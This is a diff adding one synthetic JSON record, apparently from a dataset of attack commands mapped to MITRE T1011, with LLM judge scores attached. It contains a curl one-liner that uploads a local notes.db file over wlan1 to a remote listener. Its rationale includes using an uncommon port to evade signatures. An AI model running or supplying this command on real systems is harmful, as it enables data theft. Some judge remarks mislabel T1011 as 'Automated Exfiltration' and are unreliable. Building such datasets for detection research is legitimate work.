@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && curl --silent --show-error --interface wlan1 --max-time 5 -T /home/user/.config/notes.db http://10.55.88.9:49190/upload",
+  "explanation": "Uses curl bound to wlan1 to PUT a file to an HTTP listener on a high port, representing exfiltration over a different network medium per T1011.",
+  "rationale_steps": [
+    "Check wlan1 operability with iwconfig.",
+    "Force the HTTP transfer over wlan1 via curl's --interface option.",
+    "Use an uncommon port to avoid typical web traffic signatures while not altering system routing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-998ddfac",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with valid redirections, a proper && chain, and correct curl flags and arguments.",
+        "semantic_score": 4,
+        "semantic_justification": "It non-interactively uploads a local file via HTTP bound to wlan1, achieving plausible exfiltration, though it lacks scheduling/retry elements typical of automated exfiltration.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:26:44.575758Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags for both iwconfig and curl, and correct command chaining with && operator.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 (Automated Exfiltration) by first checking if the wlan1 interface exists and then using curl to exfiltrate a database file over HTTP to a specific IP and port through that interface.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:26:47.457975Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid commands, flags, arguments, and proper command chaining using `&&` and redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly uses `curl` to exfiltrate a plausible sensitive file (`notes.db`) over HTTP, explicitly binding to a specific wireless interface (`wlan1`) as a 'different network medium,' fully aligning with T1011 Automated Exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T02:27:00.559153Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
